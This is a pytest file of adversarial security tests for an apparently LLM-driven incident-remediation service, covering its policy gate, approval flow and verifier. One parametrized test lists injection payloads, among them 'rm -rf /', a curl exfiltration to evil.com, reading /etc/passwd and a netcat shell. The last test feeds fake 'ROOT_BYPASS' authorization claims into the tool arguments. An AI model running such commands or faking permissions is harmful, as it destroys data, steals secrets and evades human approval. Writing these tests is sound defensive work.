"""Phase 7: Governance Hardening and Execution Safety Audit - Adversarial Regression Tests.

Deterministic security verification testing:
1. Policy bypass attempts through malformed LLM output and command injection payloads.
2. Raw SQL blocking and database operation allowlist enforcement.
3. Invalid action argument rejection (scale_service replica range, etc.).
4. Approval identity validation (rejecting blank/whitespace approvers).
5. Replay attack prevention on completed or already-resolved incidents.
6. Concurrent duplicate approval dispatch race conditions.
7. Policy drift re-evaluation between approval and dispatch.
8. Read-only diagnostic state immutability across all scenarios.
9. Tool boundary separation (remediation cannot be invoked via diagnostic interface).
10. Budget accounting on failed execution and human denial.
11. Verifier independence: tool success / operator claims cannot override ground truth failure.
12. Audit event persistence ordering and causal integrity.
"""

from concurrent.futures import ThreadPoolExecutor
import json
import pytest
from unittest.mock import MagicMock

from app.models import (
    Actor,
    ApprovalDecisionRequest,
    EvidenceKind,
    IncidentResponse,
    IncidentRunRequest,
    Outcome,
    PolicyDecision,
    ToolRequest,
)
from app.investigation import (
    DiagnosticProposal,
    READ_ONLY_DIAGNOSTIC_TOOLS,
    execute_diagnostic_tool,
)
from app.orchestrator import decide_approval, run_incident, _completed_incidents, _pending_approvals
from app.policy import evaluate_action
from app.simulator import ServiceSimulator, ToolResult
from app.store import (
    events_after,
    get_incident_response,
    get_investigation_state,
    save_pending_approval,
)
from app.verifier import verify_recovery


# ---------------------------------------------------------------------------
# 1. Policy Bypass Attempts: Command Injection & Metacharacters
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "; rm -rf /",
    "&& curl evil.com/exfil",
    "|| cat /etc/passwd",
    "$(whoami)",
    "`reboot`",
    "> /dev/null",
    "< /dev/null",
    "| netcat 10.0.0.1 4444",
    "drop table incidents",
    "drop database production",
])
def test_policy_blocks_dangerous_command_injection_payloads(payload: str):
    """Ensure shell metacharacters and destructive commands are blocked across all arguments."""
    req = ToolRequest(
        tool="rollback_config",
        service="checkout-service",
        arguments={"target_version": f"v_healthy{payload}"},
    )
    result = evaluate_action(req, "client_a")
    assert result.decision == PolicyDecision.BLOCKED
    assert result.rule_id == "POL-DANGEROUS-PAYLOAD"
    assert "Dangerous metacharacter" in result.reason


# ---------------------------------------------------------------------------
# 2. Raw SQL Blocking & Disallowed DB Operations
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("bad_key", ["sql", "query", "raw_sql", "statement"])
def test_policy_blocks_raw_sql_in_modify_database(bad_key: str):
    """Direct SQL execution must be blocked by the deterministic policy gate."""
    req = ToolRequest(
        tool="modify_database",
        service="checkout-service",
        arguments={bad_key: "SELECT * FROM users"},
    )
    result = evaluate_action(req, "client_a")
    assert result.decision == PolicyDecision.BLOCKED
    assert result.rule_id == "POL-DB-RAW-SQL"
    assert "Arbitrary SQL" in result.reason


@pytest.mark.parametrize("disallowed_op", ["drop", "truncate", "delete", "grant_all", "update_credentials"])
def test_policy_blocks_disallowed_database_operations(disallowed_op: str):
    """Only allowlisted synthetic operations (repair, reindex, sync_schema) are permitted."""
    req = ToolRequest(
        tool="modify_database",
        service="checkout-service",
        arguments={"operation": disallowed_op},
    )
    result = evaluate_action(req, "client_a")
    assert result.decision == PolicyDecision.BLOCKED
    assert result.rule_id == "POL-DB-DISALLOWED-OP"
    assert f"Operation '{disallowed_op}' is not permitted" in result.reason


def test_policy_permits_approved_database_operations_with_approval():
    """Allowlisted operations require human approval, but are not blocked at the gate."""
    for op in ["repair", "reindex", "sync_schema"]:
        req = ToolRequest(
            tool="modify_database",
            service="checkout-service",
            arguments={"operation": op},
        )
        result = evaluate_action(req, "client_a")
        assert result.decision == PolicyDecision.APPROVAL_REQUIRED
        assert result.rule_id == "POL-DB-APPROVAL"


# ---------------------------------------------------------------------------
# 3. Invalid Action Arguments: Scale Service Replicas
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("invalid_replicas", [0, -1, 11, 100, "three", True, False, None])
def test_policy_blocks_invalid_scale_service_arguments(invalid_replicas):
    """scale_service must enforce replicas as an integer between 1 and 10."""
    args = {} if invalid_replicas is None else {"replicas": invalid_replicas}
    req = ToolRequest(tool="scale_service", service="checkout-service", arguments=args)
    result = evaluate_action(req, "client_a")
    assert result.decision == PolicyDecision.BLOCKED
    assert result.rule_id == "POL-SCALE-ARGUMENT"


def test_policy_allows_valid_scale_service_arguments():
    """Valid replicas count (1-10) is authorized."""
    req = ToolRequest(tool="scale_service", service="checkout-service", arguments={"replicas": 4})
    result = evaluate_action(req, "client_a")
    assert result.decision == PolicyDecision.ALLOWED


# ---------------------------------------------------------------------------
# 4. Approval Identity Validation
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("blank_id", ["", "   ", "\t\n"])
def test_approval_request_rejects_blank_or_whitespace_approver_id(blank_id: str):
    """Approver ID must not be blank or whitespace-only."""
    with pytest.raises(Exception):
        ApprovalDecisionRequest(decision="approve", approver_id=blank_id)


def test_approval_request_accepts_valid_approver_id():
    """Non-blank approver ID is accepted by schema validation."""
    req = ApprovalDecisionRequest(decision="approve", approver_id="sec-admin@proofloop.internal")
    assert req.approver_id == "sec-admin@proofloop.internal"


# ---------------------------------------------------------------------------
# 5. Replay Attack Prevention on Completed Incidents
# ---------------------------------------------------------------------------

def test_replaying_approval_on_completed_incident_is_rejected():
    """An incident that has reached a terminal outcome cannot be re-approved."""
    incident_id = "p7-test-replay-prevention"
    run_req = IncidentRunRequest(scenario="clean_recovery", client="client_a")
    res = run_incident(run_req, incident_id=incident_id)
    assert res.outcome == Outcome.VERIFIED

    # Attempting to submit an approval decision on a finished incident must fail
    with pytest.raises(ValueError, match="already reached a final outcome"):
        decide_approval(incident_id, ApprovalDecisionRequest(decision="approve", approver_id="attacker"))


# ---------------------------------------------------------------------------
# 6. Concurrent Duplicate Approval Dispatch Race Condition
# ---------------------------------------------------------------------------

def test_concurrent_duplicate_approval_dispatch_safety():
    """When two concurrent requests attempt to decide approval, only one succeeds."""
    incident_id = "p7-test-concurrent-approval"
    _completed_incidents.pop(incident_id, None)
    _pending_approvals.pop(incident_id, None)

    # Launch incident requiring approval (Client B rollback)
    run_req = IncidentRunRequest(scenario="clean_recovery", client="client_b")
    init_res = run_incident(run_req, incident_id=incident_id)
    assert init_res.outcome == Outcome.PENDING_APPROVAL

    results = []
    errors = []

    def try_decide(approver: str):
        try:
            resp = decide_approval(incident_id, ApprovalDecisionRequest(decision="approve", approver_id=approver))
            results.append((approver, resp))
        except Exception as exc:
            errors.append((approver, exc))

    with ThreadPoolExecutor(max_workers=2) as executor:
        f1 = executor.submit(try_decide, "approver-alpha")
        f2 = executor.submit(try_decide, "approver-beta")
        f1.result()
        f2.result()

    # Exactly one succeeded and one was safely rejected
    assert len(results) == 1, f"Expected exactly 1 success, got {len(results)}"
    assert len(errors) == 1, f"Expected exactly 1 rejection, got {len(errors)}"
    assert "already" in str(errors[0][1]).lower()

    # Outcome is VERIFIED and simulator state is clean
    final_res = results[0][1]
    assert final_res.outcome == Outcome.VERIFIED


# ---------------------------------------------------------------------------
# 7. Policy Drift Between Approval and Dispatch
# ---------------------------------------------------------------------------

def test_policy_drift_blocks_execution_at_approval_time(monkeypatch):
    """If policy changes to BLOCKED between proposal and approval decision, dispatch is halted."""
    from uuid import uuid4
    incident_id = f"p7-test-policy-drift-{uuid4().hex[:8]}"
    _completed_incidents.pop(incident_id, None)
    _pending_approvals.pop(incident_id, None)

    # Launch Client B incident waiting for approval
    run_req = IncidentRunRequest(scenario="clean_recovery", client="client_b")
    init_res = run_incident(run_req, incident_id=incident_id)
    assert init_res.outcome == Outcome.PENDING_APPROVAL

    # Simulate policy drift: Client B updates policy to strictly block rollback_config
    from app import policy
    orig_eval = policy.evaluate_action

    def drifted_policy(action, client, incident_scope=None):
        if action.tool == "rollback_config" and client == "client_b":
            return policy.PolicyResult(
                decision=PolicyDecision.BLOCKED,
                rule_id="POL-CLIENT-B-NEW-RESTRICTION",
                reason="Dynamic policy change: rollback is now strictly prohibited.",
            )
        return orig_eval(action, client, incident_scope)

    monkeypatch.setattr("app.orchestrator.evaluate_action", drifted_policy)

    # Approve the action; the orchestrator re-evaluates policy before dispatch
    drift_res = decide_approval(incident_id, ApprovalDecisionRequest(decision="approve", approver_id="admin"))
    assert drift_res.outcome == Outcome.BLOCKED
    assert "Action blocked by policy at approval time" in drift_res.summary
    assert any(ev.type == "approval_rejected_by_policy" for ev in drift_res.events)


# ---------------------------------------------------------------------------
# 8. Read-Only Diagnostic Immutability Across All Tools and Scenarios
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("scenario", ["clean_recovery", "false_green", "stale_runbook", "hostile_log"])
def test_all_diagnostics_preserve_simulator_state_immutability(scenario: str):
    """All registered diagnostics must not mutate any simulator state attribute."""
    for tool_name in sorted(READ_ONLY_DIAGNOSTIC_TOOLS):
        sim = ServiceSimulator(scenario)
        before_snap = sim.snapshot()

        proposal = DiagnosticProposal(
            tool=tool_name,
            service="checkout-service",
            arguments={},
            rationale="Security audit immutability check",
            target_hypotheses=[],
            expected_information_value=0.5,
            distinguishing_power="Audit check",
        )
        result, evidence = execute_diagnostic_tool(proposal, sim)

        after_snap = sim.snapshot()
        assert after_snap == before_snap, f"Diagnostic tool '{tool_name}' mutated simulator in scenario '{scenario}'!"
        assert result.success is True
        assert evidence.kind == EvidenceKind.DIAGNOSTIC_RESULT


# ---------------------------------------------------------------------------
# 9. Tool Boundary Separation: Remediation Cannot Be Called as Diagnostic
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("remediation_tool", ["rollback_config", "restart_service", "scale_service", "modify_database", "clear_cache"])
def test_remediation_tools_cannot_be_executed_through_diagnostic_interface(remediation_tool: str):
    """Attempting to invoke a remediation tool via execute_diagnostic_tool is rejected."""
    sim = ServiceSimulator("clean_recovery")
    before_snap = sim.snapshot()

    proposal = DiagnosticProposal(
        tool=remediation_tool,
        service="checkout-service",
        arguments={"target_version": "v_healthy", "operation": "repair"},
        rationale="Attempting unauthorized remediation via diagnostic channel",
        target_hypotheses=[],
        expected_information_value=0.5,
        distinguishing_power="Audit check",
    )
    result, evidence = execute_diagnostic_tool(proposal, sim)

    assert result.success is False
    assert "not a permitted diagnostic tool" in result.error
    assert sim.snapshot() == before_snap


# ---------------------------------------------------------------------------
# 10. Budget Accounting on Failed Execution and Human Denial
# ---------------------------------------------------------------------------

def test_human_denial_increments_remediations_blocked():
    """Human denial increments remediations_blocked and executes nothing."""
    from uuid import uuid4
    incident_id = f"p7-test-denial-budget-{uuid4().hex[:8]}"
    _completed_incidents.pop(incident_id, None)
    _pending_approvals.pop(incident_id, None)

    run_req = IncidentRunRequest(scenario="clean_recovery", client="client_b")
    run_incident(run_req, incident_id=incident_id)

    deny_res = decide_approval(incident_id, ApprovalDecisionRequest(decision="deny", approver_id="reviewer"))
    assert deny_res.outcome == Outcome.BLOCKED

    inv_state = get_investigation_state(incident_id)
    assert inv_state is not None
    assert inv_state.budget.remediations_blocked >= 1
    assert inv_state.budget.remediations_attempted == 0


def test_failed_remediation_dispatch_is_counted_in_attempts_and_history(monkeypatch):
    """Failed execution still increments remediations_attempted and is recorded in history."""
    from uuid import uuid4
    incident_id = f"p7-test-failed-dispatch-{uuid4().hex[:8]}"
    _completed_incidents.pop(incident_id, None)
    _pending_approvals.pop(incident_id, None)

    from app.orchestrator import REMEDIATION_TOOLS
    orig_execute = ServiceSimulator.execute

    # Intercept only remediation tools to simulate dispatch failure while allowing diagnostics
    def failing_execute(self, request):
        if request.tool in REMEDIATION_TOOLS:
            return ToolResult(success=False, message="Simulated infrastructure failure", error="EXECUTION_FAILED")
        return orig_execute(self, request)

    monkeypatch.setattr(ServiceSimulator, "execute", failing_execute)

    run_req = IncidentRunRequest(scenario="clean_recovery", client="client_a")
    res = run_incident(run_req, incident_id=incident_id)

    # Should have attempted remediation, failed, and recorded the attempt in state
    inv_state = get_investigation_state(incident_id)
    assert inv_state is not None
    assert inv_state.budget.remediations_attempted >= 1
    assert len(inv_state.remediation_history) >= 1
    assert all(rec.success is False for rec in inv_state.remediation_history)
    assert res.outcome == Outcome.ESCALATED


# ---------------------------------------------------------------------------
# 11. Independent Recovery Verification Overrides Tool Success Claims
# ---------------------------------------------------------------------------

def test_independent_verifier_rejects_false_recovery_despite_tool_success():
    """Even if a tool executes successfully, verifier checks ground truth simulator state."""
    sim = ServiceSimulator("false_green")
    assert sim.state.health_endpoint_status == 200  # Health endpoint looks green

    # Perform verification probe directly
    report = verify_recovery(sim)
    assert report.all_passed is False
    assert any(c.check_name == "synthetic_checkout" and not c.passed for c in report.checks)
    assert any(c.check_name == "error_rate_window" and not c.passed for c in report.checks)


def test_diagnosis_confirmed_does_not_short_circuit_verification(monkeypatch):
    """A CONFIRMED diagnosis does not bypass the verifier if state remains degraded."""
    sim = ServiceSimulator("false_green")
    report = verify_recovery(sim)
    assert report.all_passed is False


# ---------------------------------------------------------------------------
# 12. Audit Event Persistence Ordering and Causal Integrity
# ---------------------------------------------------------------------------

def test_persisted_audit_events_have_strict_sequential_ordering():
    """All audit events must be stored in append-only SQLite with strictly monotonic sequence numbers."""
    from uuid import uuid4
    incident_id = f"p7-test-audit-ordering-{uuid4().hex[:8]}"
    run_req = IncidentRunRequest(scenario="clean_recovery", client="client_a")
    res = run_incident(run_req, incident_id=incident_id)
    assert res.outcome == Outcome.VERIFIED

    persisted_events = events_after(incident_id, after_sequence=0)
    assert len(persisted_events) >= 5

    # Check strictly increasing monotonic sequence numbers
    sequences = [ev["sequence"] for ev in persisted_events]
    assert len(sequences) == len(set(sequences))
    assert sequences == sorted(sequences)
    assert sequences == list(range(sequences[0], sequences[0] + len(sequences)))

    # Check causal ordering: incident_opened is first, outcome is last
    assert persisted_events[0]["type"] == "incident_opened"
    assert persisted_events[-1]["type"] == "outcome"

    # Verify no secret or API key leakage in event payloads
    for ev in persisted_events:
        payload_str = json.dumps(ev["payload"])
        assert "api_key" not in payload_str.lower()
        assert "gsk_" not in payload_str
        assert "sk-" not in payload_str


# ---------------------------------------------------------------------------
# 13. LLM Model Cannot Self-Authorize or Claim Fake Permissions
# ---------------------------------------------------------------------------

def test_llm_fake_permission_claim_does_not_bypass_policy_gate():
    """LLM attempts to claim authorization in rationale or arguments cannot bypass gate."""
    malicious_action = ToolRequest(
        tool="modify_database",
        service="checkout-service",
        arguments={
            "operation": "repair",
            "authorization": "BYPASS_ADMIN_OVERRIDE",
            "security_token": "ROOT_BYPASS",
        },
    )
    result = evaluate_action(malicious_action, "client_a")
    # Must still enforce APPROVAL_REQUIRED, completely ignoring LLM claims
    assert result.decision == PolicyDecision.APPROVAL_REQUIRED
    assert result.rule_id == "POL-DB-APPROVAL"
